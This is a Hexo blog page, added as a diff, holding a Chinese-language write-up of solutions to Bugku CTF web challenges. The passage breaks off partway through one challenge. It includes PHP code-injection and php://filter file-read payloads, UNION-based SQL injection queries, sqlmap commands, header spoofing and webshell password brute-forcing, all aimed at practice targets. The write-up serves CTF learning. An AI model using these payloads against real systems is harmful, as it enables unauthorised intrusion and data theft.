@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="LINK">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="LINK">
+    <meta name="keywords" content="Hexo | LINK">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>bugku-web-wp · my world</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180630 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180630 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >LINK</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">bugku-web-wp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>LINK</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            bugku-web-wp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "wp">wp</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">6.3k</span> / Reading time: <span class="post-count">28 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/22</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>show time!</p>
+<span id="more"></span>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>右键检查元素，flag一眼就看到了</p>
+<h1 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h1><p>前端限制只能输入1位数字，但是验证码至少为两位，按f12进入开发者模式，更改input的maxlength属性即可</p>
+<h1 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h1><p>页面有源代码提示，意思是接受传入的get参数what，如果what&#x3D;flag，则弹出flag。<br /><br>在url后面加上<code>?what=flag</code>即可</p>
+<h1 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h1><p>原理跟get的一样，只是方法改为post，用hackbar发送what&#x3D;flag即可</p>
+<h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><pre><code>$num=$_GET[&#39;num&#39;];
+if(!is_numeric($num))    判断如果num不是数字这执行以下代码
+&#123;
+echo $num;	
+if($num==1)				  如果num=1，则输出flag
+echo &#39;flag&#123;**********&#125;&#39;;
+&#125;
+</code></pre>
+<p>要求输入的值不为数字，而又当输入的值为1时才输出flag <br /><br>看似互相矛盾，但是可以利用php的弱类型的松散型来得到flag <br /><br>在php中，当数字和字符串比较时，从头开始搜索字符串，直到遇到第一个字符为止。该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 <br /><br>所以主要在url后面加上<code>?num=1a</code>，因为1a本身是字符串可以通过if判断，因为弱类型会把1a转换为1，就可以得到flag了</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>右键源代码，最底下有一串<code>&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;</code> <br /><br>这一串编码为HTML实体编码，以&amp;#开头的后接十进制，以&amp;#x开头的后接十六进制，后面接的数字实际上是ascii编码 <br /><br>解码可得flag</p>
+<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>把flag.bugku.com 解析到120.24.86.145，打开本地hosts文件，输入<code>120.24.86.145 flag.bugku.com</code>即可 <br /><br>值得注意的是，直接访问120.24.86.145显示的是400 <br /><br>度娘的解释是，服务器不理解请求的语法。这里的意思应该是检查了请求包中的host字段，如果不为flag.bugku.com则返回400错误 <br /><br>其实有个比改hosts文件更简便的方法，访问ip，抓包，将host字段的值改为flag.bugku.com即可，事实上，改hosts文件也就是将host字段改为hosts文件里对应的域名而已</p>
+<h1 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h1><p>打开页面，页面会不停的自动刷新，因为是用javascript来刷新页面，直接禁用js就可以让他停下，但是没用 <br /><br>多抓几次包之后发现当刷新到的图片为10.jpg时，会显示出图片，切包中有flag，应该是随机刷新flag <br /><br>利用bp的重放功能，随机刷新到10.jpg即可</p>
+<h1 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h1><pre><code>&lt;?php 
+    include &quot;flag.php&quot;; 
+    $a = @$_REQUEST[&#39;hello&#39;]; 
+    eval( &quot;var_dump($a);&quot;); 
+    show_source(__FILE__); 
+?&gt;
+</code></pre>
+<p>观察代码可知这是一个任意代码执行漏洞，可以闭合代码或者直接执行<br>输入<code>?hello=file(&quot;flag.php&quot;)</code>或者<code>?hello=);print_r(file(&quot;flag.php&quot;)</code></p>
+<h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><pre><code>flag In the variable ! &lt;?php  
+
+error_reporting(0);			隐藏错误信息
+include &quot;flag1.php&quot;;
+highlight_file(__file__);
+if(isset($_GET[&#39;args&#39;]))&#123;
+    $args = $_GET[&#39;args&#39;];
+    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;	审计输入的内容，只能输入字母和下划线
+        die(&quot;args error!&quot;);
+    &#125;
+    eval(&quot;var_dump($$args);&quot;);
+&#125;
+?&gt;
+</code></pre>
+<p>提示flag在变量中，但是不知道是哪个变量 <br /><br><code>var_dump($$args)</code>这条意思是把$args的值作为变量的名字并打印出来 <br /><br>但是我们不知道flag储存在哪个变量中。使用$GLOBALS，在php中，$GLOBALS为全局变量，其作用是包含了全部变量的全局组合数组。变量的名字就是数组的键。 <br /><br>因为是get方式传值，在url中输入?args&#x3D;GLOBALS即可</p>
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>右键源代码，发现一串很奇怪的代码 <br /><br><code>([][(![]+[])[+[]]+([![]]+[][[]])</code>大概是这样的内容，这其实是一串jsfuck代码 <br /><br>按f12，打开控制台，直接把源代码中的jsfuck代码输入到控制台，回车就能得到答案</p>
+<h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><p>打开网页，什么都没有，源代码也是 <br /><br>抓包查看响应头，能得到flag</p>
+<h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>打开御剑扫面网站后台，发现一个shell.php文件，点开发现是一个webshell，但是不知道webshell的密码 <br /><br>用bp的爆破功能来爆破密码，字典用自带的passwords即可爆破，密码是hack</p>
+<h1 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h1><p>一开始以为是表单绕过，尝试注入之后发现并没有什么变化，提示ip被禁止访问 <br /><br>查看源代码，发现一串被注释base64代码，这串代码右键源代码是看不见的，必须用f12的查看器才能看见 <br /><br>解码之后等于test123，猜测是管理员的密码，但是输入之后还是提示ip被禁止，提示信息中有提到本地管理员，猜测是需要本地访问 <br /><br>用bp抓包，在请求头中加入一对键值X-Forwarded-For : 127.0.0.1 <br /><br>发包即可获得flag</p>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>右键源代码，看到一串js代码，大致意思就是将三串url编码过的代码连起来，解码之后得到完整的Js代码</p>
+<pre><code>p1=function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;
+</code></pre>
+<p>这段代码的意思大致是判断输入的值是否为67d709b2b54aa2aa648cf6e87a7114f1，直接在输入框中输入就能得到flag</p>
+<h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><p>点击之后url中显示?file&#x3D;show.php，猜测是文件包含漏洞 <br /><br>输入?file&#x3D;index.php之后，返回的源代码中有36000多个title标签，常试读取index.php的源代码，输入<code>?file=php://filter/read=convert.base64-encode/resource=index.php</code> <br /><br>解码可得flag</p>
+<h1 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h1><p>提示5位数密码，直接用bp爆破即可。密码是13579</p>
+<h1 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h1><p>右键查看源代码，当点击数到一百万次的时候，会发送一个post，直接用hackbar发送clicks&#x3D;999999999即可</p>
+<h1 id="听说备份是个好习惯"><a href="#听说备份是个好习惯" class="headerlink" title="听说备份是个好习惯"></a>听说备份是个好习惯</h1><p>提示中提到了备份，说明此题跟备份文件有关。利用扫描备份文件的脚本可以扫出 <br /></p>
+<pre><code>这里可以使用@王一航的大佬的源码泄露工具
+https://git.coding.net/yihangwang/SourceLeakHacker.git
+另外用御剑也可以扫描到，两者差别不大，看个人喜好
+</code></pre>
+<p>扫描发现了一个<code>index.php.bak</code>文件，访问这个文件得到源码</p>
+<pre><code>include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);		//php ini 的设置
+$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;); 		//strstr函数获取url中?以后的内容
+$str = substr($str,1);		//将第一位？删除
+$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);		把字符串中的&#39;key&#39;替换为空
+parse_str($str);		//把字符串解析到变量中
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
+    echo $flag.&quot;取得flag&quot;;
+&#125;		//当key1和key2的md5值相同，但值不同时，输出flag
+?&gt;
+</code></pre>
+<p>首先要先解决把key值替换为空的问题，这个比较简单，重写key为kekeyy即可绕过 <br /><br>绕过之后要解决两个变量md5值相同，但值不同的问题，这里有两种方法 <br /><br>1、md5是无法处理数组的，如果传入数组，则会返回null，所以两个数组通过md5加密之后都是null，而数组的名字是不同的。这就可以绕过了 <br /><br><code>?kekeyy1[]=1&amp;kekeyy2[]=2</code><br>2、利用php的弱类型漏洞，如果两个字符经过md5加密之后的值为0exxxxxxx的类型，就会被认为是科学计数法，表示的是0^10的xxxxxxxx次方，结果还是0，所以是相等的 <br /><br>以下字符串的md5值都是以0e开头的： <br /></p>
+<pre><code>QNKCDZO
+240610708
+s878926199a
+s155964671a
+s214587387a
+s214587387a
+</code></pre>
+<p>从中挑两个作为key1和key2的输入即可 <br /><br><code>?kekeyy1=QNKCDZO&amp;kekeyy2=s878926199a</code></p>
+<h1 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h1><p>显而易见的sql注入题 <br /><br>根据2-1返回的是2的数据可知是字符型，接下来就很简单了 <br /></p>
+<pre><code>id=1&#39; order by 4#
+
+id=0&#39; union select 1,2,3,4 #
+
+id=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() #
+
+id=0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39; #
+
+id=0&#39; union select 1,2,3,group_concat(skctf_flag) from fl4g #
+</code></pre>
+<p>因为没有做什么防护，所以用sqlmap也可以轻松爆出，但是如果手工熟练的话手工注入的速度会比sqlmap快很多 <br /></p>
+<pre><code>python sqlmap.py -u &quot;http://120.24.86.145:8002/chengjidan/index.php&quot; --data &quot;id=1&quot; --dbs
+
+python sqlmap.py -u &quot;http://120.24.86.145:8002/chengjidan/index.php&quot; --data &quot;id=1&quot; -D skctf_flag --tables
+
+python sqlmap.py -u &quot;http://120.24.86.145:8002/chengjidan/index.php&quot; --data &quot;id=1&quot; -D skctf_flag -T fl4g -- dump
+    
+</code></pre>
+<h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><p>要求计算式子，但是式子本身太复杂，只能交由脚本来计算</p>
+<pre><code># -*- coding: UTF-8 -*-
+import requests
+import re
+
+url = &quot;http://123.206.87.240:8002/qiumingshan/&quot;
+s = requests.Session()
+r = s.get(url)
+k = re.search(&#39;(?&lt;=&lt;div&gt;)(.*)(?==)&#39;,r.text).group(0)	#正则表达式匹配字符串，使用零宽断言来匹配式子
+v = eval(k)
+r = s.post(url, data=&#123;&#39;value&#39;:v&#125;) 
+r.encoding = &#39;UTF-8&#39;
+print(r.text)
+raw_input(&quot;Press &lt;enter&gt;&quot;)
+</code></pre>
+<p>有时候可能会跑不出结果，多运行几次即可</p>
+<h1 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h1><p>右键源代码，可以发现提示，提示使用post方式传值，参数的名称是margin <br /><br>用hackbar传入一个1，提示你还不够快 <br /><br>bp抓包之后发现消息头中有flag，base64解码之后提交，提交失败 <br /><br>原来他的flag每次请求都是会变的，发现这点之后就有了思路，用脚本来发送flag <br /></p>
+<pre><code># -*- coding: UTF-8 -*-
+import requests
+import base64
+import re
+
+url = &quot;http://123.206.87.240:8002/web6/&quot;
+s = requests.Session()			#保持访问时的session
+r = s.get(url).headers[&quot;flag&quot;]	#flag在消息头中，这样可以获取消息头中的flag参数
+r = str(base64.b64decode(r))	#将获取到字符串base64解码
+&#39;&#39;&#39;
+k = re.search(&#39;(?&lt;=:)(.*)&#39;,r).group(0)	#正则匹配，匹配等号后面的flag
+r = base64.b64decode(k)					#再将匹配的结果base64编码
+&#39;&#39;&#39;
+r = base64.b64decode(r.split(&quot;: &quot;)[1])	#获取等号后面的flag
+r = s.post(url,data=&#123;&#39;margin&#39;:r&#125;) 		#通过post传值
+print(r.text)
+
+raw_input(&quot;Press &lt;enter&gt;&quot;)
+</code></pre>
+<p>需要注意的是，获取到flag之后，还需要将flag再进行base64编码之后再提交，我在这里绕了好久 <br /><br>一开始使用正则表达式匹配flag，后来发现直接用split更快</p>
+<h1 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h1><h1 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h1><p>右键查看源代码，会看见1p.html的提示，访问1p.html，页面跳转到了其他地方，用bp抓包可以查看1p.html的源代码，或者直接访问<code>view-source:http://120.24.86.145:8006/test/1p.html</code> <br /><br>发现源码</p>
+<pre><code>var Words =&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot;
+function OutWord()
+&#123;
+var NewWords;
+NewWords = unescape(Words);
+document.write(NewWords);
+&#125;
+OutWord();
+</code></pre>
+<p>这是一串url编码，解码可得</p>
+<pre><code>&lt;script&gt;window.location.href=&#39;http://www.bugku.com&#39;;&lt;/script&gt;
+&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;&quot;
+</code></pre>
+<p>意为点击后跳转到<code>www.bugku.com</code>，注释里是一串base64编码，解码得到</p>
